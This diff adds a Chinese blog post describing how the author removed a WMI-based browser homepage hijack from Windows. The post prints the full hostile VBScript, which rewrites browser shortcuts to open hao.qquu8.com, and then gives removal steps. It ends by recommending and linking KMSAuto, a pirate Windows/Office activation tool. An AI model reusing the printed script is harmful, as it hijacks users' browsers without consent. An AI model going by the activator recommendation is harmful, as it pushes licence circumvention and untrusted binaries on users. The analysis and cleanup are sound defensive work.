@@ -1,0 +1,107 @@
+---
+layout: post
+title: 抢救被流氓网站劫持的浏览器主页
+description:  为什么hao123、2345等网站的老板们就不能文明点呢？
+author: ArlenLuo
+category:
+- 极客志
+---
+
+最近重装了一次电脑。尽管什么百度系的软件我都没有下载，Chrome浏览器的主页还是被硬生生劫持了。每次点开后的主页是hao.qquu8.com这个链接，紧接着它会跳向hao123。电脑上原装的其他浏览器（IE和Edge）也是这样，弄得每次打开浏览器就被恶心一下，很是恼火。
+
+![L1]
+
+我们先来看看问题在哪。右键快捷方式查看属性：
+
+![L2]
+
+哦，原来快捷方式被改了，后面加了一段url。把它删了试试？
+
+还是不行，几分钟后还是被改回来了。
+
+我在很多平台上找了解决办法。有的试了没有效果，重新开机后还是一样的毛病，有的推荐装“管家”，但这种以毒攻毒的办法无异于饮鸩止渴。最后终于有一种靠谱的方法，经过实验和一点修改，完美解决！
+
+主页被劫持的原理是一段通过WMI发起的定时自动运行脚本，WMI（Windows Management Instrumentation）可以理解成Windows系统后台运行的一个事件管理器。为查看WMI事件，先去下载WMITools并安装：<a href ="\images\post6\WMITools.exe" target="_blank">WMI工具</a>。
+
+之后打开WMI Event Viewer：
+
+![L3]
+
+点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目：
+
+![L4]
+
+在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性：
+
+![L5]
+
+在Script Text那一栏我们可以看到这段脚本：
+
+<pre>
+On Error Resume Next
+
+Const link = "http://hao.qquu8.com/?m=yx&r=j"
+Const link360 = "http://hao.qquu8.com/?m=yx&r=j&s=3"
+browsers = "114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe"
+lnkpaths = "C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
+browsersArr = split(browsers,",")
+Set oDic = CreateObject("scripting.dictionary")
+For Each browser In browsersArr
+    oDic.Add LCase(browser), browser
+Next
+lnkpathsArr = split(lnkpaths,",")
+Set oFolders = CreateObject("scripting.dictionary")
+For Each lnkpath In lnkpathsArr
+    oFolders.Add lnkpath, lnkpath
+Next
+Set fso = CreateObject("Scripting.Filesystemobject")
+Set WshShell = CreateObject("Wscript.Shell")
+For Each oFolder In oFolders
+    If fso.FolderExists(oFolder) Then
+        For Each file In fso.GetFolder(oFolder).Files
+            If LCase(fso.GetExtensionName(file.Path)) = "lnk" Then
+                Set oShellLink = WshShell.CreateShortcut(file.Path)
+                path = oShellLink.TargetPath
+                name = fso.GetBaseName(path) & "." & fso.GetExtensionName(path)
+                If oDic.Exists(LCase(name)) Then
+                    If LCase(name) = LCase("360se.exe") Then
+                        oDicShellLink.Arguments = link360
+                    Else
+                        oShellLink.Arguments = link
+                    End If
+                    If file.Attributes And 1 Then
+                        fsoile.Attributes = file.Attributes - 1
+                    End If
+                    oShellLink.Save
+                End If
+            End If
+        Next
+    End If
+Next
+</pre>
+
+终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。
+
+查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name="VBScriptKids_filter"右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持：
+
+![L6]
+
+当然在这时候，你可以点击之前下载的WMI安装包，把WMI系列工具卸载掉。
+
+想说对百度这家公司的反感度又深了一层。
+
+最后提一下电脑中毒的原因。我分析是前几天用了小马激活这个工具来激活Windows系统，当时并没有激活成功反而还引来了病毒。推荐一款<a href ="https://myfreeproject.com/soft/81-kmsauto-net-2016.html" target="_blank">俄罗斯人开发的工具</a>，可以成功激活Windows系统和Office软件，也不会招来一些流氓脚本：<a href ="\images\post6\KMSAuto-Net-1.4.9.zip" target="_blank">KMSAuto</a>。
+
+[L1]: \images\post6\L1.jpg
+{: class="img-responsive"}
+[L2]: \images\post6\L2.jpg
+{: class="img-small"}
+[L3]: \images\post6\L3.jpg
+{: class="img-responsive"}
+[L4]: \images\post6\L4.jpg
+{: class="img-responsive"}
+[L5]: \images\post6\L5.jpg
+{: class="img-medium"}
+[L6]: \images\post6\L6.jpg
+{: class="img-responsive"}
+
